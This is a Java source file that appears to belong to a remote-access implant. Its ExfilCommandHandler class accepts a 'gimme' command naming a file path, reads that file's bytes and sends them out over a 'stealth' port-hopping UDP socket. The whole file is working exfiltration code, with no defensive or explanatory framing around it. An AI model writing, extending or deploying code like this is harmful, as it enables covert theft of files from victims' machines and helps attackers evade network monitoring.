package exfilfunctions;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;

import networking.MultiserviceStealthUDPSocket;

public class ExfilCommandHandler {
	public ExfilCommandHandler(){
		
	}
	
	public boolean checkExfil(String input){
		if(input.startsWith("gimme")){
			return true;
		}
		else{
			return false;
		}
	}

	public String handleExfil(String command, MultiserviceStealthUDPSocket msus) {
		try{
			System.out.println("[+] Exfil Begins");
			String[] commandParts = command.split(" ");
			String path = commandParts[1];
			int waitTime = Integer.parseInt(commandParts[2]);
			FileInputStream fis = new FileInputStream(new File(path));
			int c;
			ArrayList<Byte> exfilBytes = new ArrayList<Byte>();
			while ((c = fis.read()) != -1) {
				System.out.println(Integer.toHexString((byte) c));
				System.out.println((char) c);
				exfilBytes.add((byte) c);
	        }
			byte[] exfilByteArray = new byte[exfilBytes.size()];
			for(int i = 0; i < exfilByteArray.length; i++){
				exfilByteArray[i]=exfilBytes.get(i);
			}
			System.out.println("[+] Data Read Complete");
			msus.sendHoppingStealthMessage(exfilByteArray, waitTime);
			return "Exfil Success!";
			
		}catch(Exception e){
			return "Exfil Failed! \n"+e.toString();
		}
		
	}
}
